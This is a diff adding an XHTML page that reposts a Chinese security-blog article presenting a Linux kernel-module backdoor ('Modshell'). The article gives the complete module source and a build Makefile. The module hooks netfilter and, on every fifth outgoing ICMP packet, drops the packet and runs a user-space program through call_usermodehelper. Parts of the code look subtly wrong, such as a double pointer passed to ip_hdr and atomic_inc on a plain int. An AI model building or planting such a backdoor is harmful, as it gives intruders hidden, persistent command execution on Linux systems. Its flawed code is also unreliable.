@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>猥琐的netfilter backdoor</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>猥琐的netfilter backdoor</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzkyODM5NzQwNQ==&amp;mid=2247485662&amp;idx=1&amp;sn=a34af261cc20d97157fe1e8096f9c9e4&amp;chksm=c21829ecf56fa0fa41a9b15c3087aa9dc82e7af9b5849bf5dfe5e8ca37844866e67bd3d7d77c&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzkyODM5NzQwNQ==&amp;mid=2247485662&amp;idx=1&amp;sn=a34af261cc20d97157fe1e8096f9c9e4&amp;chksm=c21829ecf56fa0fa41a9b15c3087aa9dc82e7af9b5849bf5dfe5e8ca37844866e67bd3d7d77c&amp;scene=27#wechat_redirect</a></blockquote><p style="line-height: 1.5em;">【描述】</p><p style="line-height: 1.5em;"><br/>主要是在netfilter chains中加入自己的一个filter,例如我每次执行ping的时候就会触发这个代码，并且我在内核态的时候使用call_usermodehelper来调用用户态的程序。<br/><br/></p><p style="line-height: 1.5em;">【代码】</p><pre><p style="line-height: 1.5em;">	#include &lt;linux/kernel.h&gt;<br/>
+	#include &lt;linux/module.h&gt;<br/>
+	#include &lt;linux/ip.h&gt;<br/>
+	#include &lt;linux/version.h&gt;<br/>
+	#include &lt;linux/skbuff.h&gt;<br/>
+	#include &lt;linux/netfilter.h&gt;<br/>
+	#include &lt;linux/netfilter_ipv4.h&gt;<br/>
+	#include &lt;linux/moduleparam.h&gt;<br/>
+	#include &lt;linux/netfilter_ipv4/ip_tables.h&gt;<br/>
+	#include &lt;linux/kmod.h&gt;</p><p><br/></p><p>
+	MODULE_LICENSE("GPL");<br/>
+	MODULE_AUTHOR("Powered By Cnbird!");<br/>
+	MODULE_DESCRIPTION("Modshell version 0.1!");</p><p>
+	static int pktcnt = 0;<br/>
+	static unsigned int modshell_func(unsigned int hooknum, struct sk_buff **skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))<br/>
+	{<br/>
+	   const struct iphdr *iph = ip_hdr(skb);<br/>
+	   if(iph-&gt;protocol == 1){<br/>
+	      atomic_inc(&amp;pktcnt);<br/>
+	      if(pktcnt%5 == 0){<br/>
+	          char * envp[] = { "HOME=/", "PATH=/usr/bin:/sbin:/bin",NULL };<br/>
+	      char * argv[] = { "/usr/bin/touch", "/tmp/cnbird", NULL };<br/>
+	      int result;<br/>
+	      result=call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);<br/>
+	      printk(KERN_NOTICE "Execute Command is:", result);<br/>
+	      return NF_DROP;<br/>
+	      }<br/>
+	   }<br/>
+	   return NF_ACCEPT;<br/>
+	}</p><p>
+	static struct nf_hook_ops nfho={<br/>
+	        .hook           = modshell_func, <br/>
+	        .owner          = THIS_MODULE,<br/>
+	        .pf             = PF_INET,<br/>
+	        .hooknum        = NF_INET_LOCAL_OUT, <br/>
+	        .priority       = NF_IP_PRI_FIRST, <br/>
+	};</p><p>
+	static int __init modshell_init(void)<br/>
+	{<br/>
+	    return nf_register_hook(&amp;nfho);<br/>
+	}</p><p>
+	static void __exit modshell_fini(void)<br/>
+	{<br/>
+	    nf_unregister_hook(&amp;nfho);<br/>
+	}</p><p>
+	module_init(modshell_init);<br/>
+	module_exit(modshell_fini);</p><p>【安装】<br/>
+	 </p><p>
+	root@kali:/pentest/modshell# cat Makefile <br/>
+	obj-m += modshell.o</p><p>
+	all:<br/>
+	    make -iC /lib/modules/$(shell uname -r)/build M=$(PWD) modules</p><p>
+	clean:<br/>
+	    make -iC /lib/modules/$(shell uname -r)/build M=$(PWD) clean<br/>
+	 <br/>【效果】</p><p><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz/jREibmKWC5MBkbvQDAy6dnibnwG7XcjB2eibFpMu1MGI7xW8DiczBQBBMLUjTNEC0MbrNMOLFEJMXCGKHAkwFgL1kQ/0?wx_fmt=png" data-ratio="0.6369047619047619" data-w="504" src="../Images/85efcc5bebbab2a35dcaf15ad1d76ae2.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/jREibmKWC5MBkbvQDAy6dnibnwG7XcjB2eibFpMu1MGI7xW8DiczBQBBMLUjTNEC0MbrNMOLFEJMXCGKHAkwFgL1kQ/0?wx_fmt=png"/><br/><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz/jREibmKWC5MBkbvQDAy6dnibnwG7XcjB2eicFvibrDM8ZtMF8klugxmWM3DtMcgalU8vhG5qwFrvsm70Q81dS4SnBw/0?wx_fmt=png" data-ratio="0.6567460317460317" data-w="504" src="../Images/c604f8a34d3a0d5f9cf9104fa58b0e17.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/jREibmKWC5MBkbvQDAy6dnibnwG7XcjB2eicFvibrDM8ZtMF8klugxmWM3DtMcgalU8vhG5qwFrvsm70Q81dS4SnBw/0?wx_fmt=png"/><br/></p><p>【项目地址】<br/>https://github.com/cnbird1999/modshell</p>
+ 
+ 										<p>本文固定链接: http://www.sec-un.org/wretched-netfilter-backdoor.html</p><p>转载请注明: ThreatActor</p><time>2015年10月27日</time><p>于 Sec-UN 安全圈 发表</p></pre><p><br/></p>
+        
+</body>
+</html>
